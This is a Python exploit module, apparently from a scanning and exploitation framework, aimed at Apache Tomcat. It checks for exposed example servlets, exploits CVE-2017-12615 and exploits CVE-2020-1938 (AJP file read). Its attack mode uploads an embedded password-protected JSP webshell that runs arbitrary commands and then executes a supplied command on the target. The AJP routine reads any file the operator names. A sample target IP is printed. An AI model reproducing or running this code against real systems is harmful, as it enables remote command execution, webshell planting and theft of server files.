import random,string,json,re,socket
import util.globalvar as GlobalVar
from urllib.parse import urlparse, quote
from util.ExpRequest import ExpRequest,Output
from operator import methodcaller
from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
################
##--ApacheSolr--##
#tomcat_examples 实例文件session
#cve_2017_12615  PUT上传WEBSHELL
#cve_2020_1938   AJP读取文件
################
class ApacheTomcat():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.status = env.get('status')

        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.port = self.getipport.port
        if self.port == None and r"https://" in self.url:
            self.port = 443
        elif self.port == None and r"http://" in self.url:
            self.port = 80
        # Do not use the payload:CVE-2017-12615 when checking
        # Use the payload:CVE-2017-12615 when exploiting
        # Because it is too harmful
        self.payload_cve_2017_12615='<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><' \
            '%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro =' \
            ' Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInpu' \
            'tStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.cl' \
            'ose();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("password".equ' \
            'als(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCm' \
            'd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'
    def tomcat_examples(self):
        appName = 'Apache Tomcat'
        pocname = 'Examples File'
        path = '/examples/servlets/servlet/SessionExample'
        method = 'get'
        desc = 'Apache Tomcat: Examples File'
        info = "[url:"+self.url+path+" ]"
        payload = ''
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            request = exprequest.get(self.url+path, timeout=self.timeout, verify=False)
            if request.status_code == 200 and r"Session ID:" in request.text:
                output.echo_success(method, info)
                self.status = 'success'
            else:
                output.fail()
        except Exception as error:
            output.error_output(str(error))       
                
    def cve_2017_12615(self):
        appName = 'Apache Tomcat'
        pocname = 'CVE-2017-12615'
        name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
        path = '/'+name+'.jsp/'
        method = 'put'
        desc = 'Apache Tomcat: CVE-2017-12615'
        info = ''
        payload1 = ":-)"
        payload2 = self.payload_cve_2017_12615
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.put(self.url+path, data=payload1, timeout=self.timeout, verify=False)
                request = exprequest.get(self.url+path[:-1], timeout=self.timeout, verify=False)
                if ':-)' in request.text:
                    info = "[upload]"+" [url:"+self.url+"/"+name+".jsp ]"
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                request = exprequest.put(self.url+path, data=payload2, timeout=self.timeout, verify=False)
                urlcmd = self.url+"/"+name+".jsp?pwd=password&cmd="+self.cmd
                request = exprequest.get(urlcmd, timeout=self.timeout, verify=False)
                info = "Put Webshell: "+urlcmd+"\n-------------------------\n"+request.text
                output.echo_success(method, info)
        except Exception as error:
            output.error_output(str(error))

    def cve_2020_1938(self):
        appName = 'Apache Tomcat'
        pocname = 'CVE-2020-1938'
        path = ''
        output_method = "ajp"
        desc = 'Apache Tomcat: CVE-2020-1938'
        info = ''
        payload = ''
        headers = {'User-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        #self.default_port = self.port
        default_port = 8009
        default_requri = '/'
        default_headers = {}
        username = None
        password = None
        getipport = urlparse(self.url)
        hostname = getipport.hostname
        request = "null"
        rawdata = ">_< Tomcat cve-2020-2019 vulnerability uses AJP protocol detection\n" 
        rawdata += ">_< So there is no HTTP protocol request and response"
        if self.vuln != 'False':
            default_file = self.cmd
        else:
            default_file = "WEB-INF/web.xml"
        info = "[file contains]"+" [port:"+str(default_port)+" file:"+default_file+"]"
        try:
            socket.setdefaulttimeout(self.timeout)
            Mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            Mysocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            Mysocket.connect((hostname, default_port))
            Mystream = Mysocket.makefile("rb", buffering=0) #PY2: bufsize=0
            attributes = [
                {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', default_file]},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']},
            ]
            method = 'GET'
            forward_request = prepare_ajp_forward_request(hostname, default_requri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
            if username is not None and password is not None:
                forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic "+ str(("%s:%s" %(username, password)).encode('base64').replace("\n" ""))
            for h in default_headers:
                forward_request.request_headers[h] = headers[h]
            for a in attributes:
                forward_request.attributes.append(a)
            responses = forward_request.send_and_receive(Mysocket, Mystream)
            if len(responses) == 0:
                return None, None
            snd_hdrs_res = responses[0]
            data_res = responses[1:-1]
            request = (b"".join([d.data for d in data_res]).decode())
            #print ((b"".join([d.data for d in self.data_res]).decode()))
            #return self.snd_hdrs_res, self.data_res
            #print (self.request)
            if 'xml' in request:
                output.echo_success(method, info)
                self.status = 'success'
                print(request)
            else:
                output.fail()
        except socket.timeout as error:
            output.timeout_output()
        except NotImplementedError:
            output.error_output('NotImplementedError')
        except Exception as error:
            output.error_output(str(error))

    # Apache Tomcat CVE-2020-1938 "AJP" protocol check def
def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
    fr.method = method
    fr.protocol = "HTTP/1.1"
    fr.req_uri = req_uri
    fr.remote_addr = target_host
    fr.remote_host = None
    fr.server_name = target_host
    fr.server_port = 80
    fr.request_headers = {
        'SC_REQ_ACCEPT': 'text/html, application/xhtml+xml, application/xml;q=0.9, image/webp,*/*;q=0.8',
        'SC_REQ_CONNECTION': 'keep-alive',
        'SC_REQ_CONTENT_LENGTH': '0',
        'SC_REQ_HOST': target_host,
        'SC_REQ_USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Accept-Encoding': 'gzip, deflate, sdch',
        'Accept-Language': 'en-US, en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }
    fr.is_ssl = False
    fr.attributes = []
    return fr

print("""eg: http://49.4.91.247:9001/
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Apache Tomcat     | tomcat_examples  |  Y  |  N  | all version, /examples/servlets/servlet                     |
| Apache Tomcat     | cve_2017_12615   |  Y  |  Y  | 7.0.0 - 7.0.81, put method any files upload                 |
| Apache Tomcat     | cve_2020_1938    |  Y  |  Y  | 6, 7 < 7.0.100, 8 < 8.5.51, 9 < 9.0.31 arbitrary file read  |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
def check(**kwargs):
    result_list = []
    result_list.append('----------------------------')
    ExpApacheTomcat = ApacheTomcat(**kwargs)
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpApacheTomcat, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
        return ExpApacheTomcat.status
    else:#调用所有函数
        for func in dir(ApacheTomcat):
            if not func.startswith("__") and not func.startswith("_"):
                methodcaller(func)(ExpApacheTomcat)
                result_list.append(func+' -> '+ExpApacheTomcat.status)
                ExpApacheTomcat.status = 'fail'
    result_list.append('----------------------------')
    return '\n'.join(result_list)











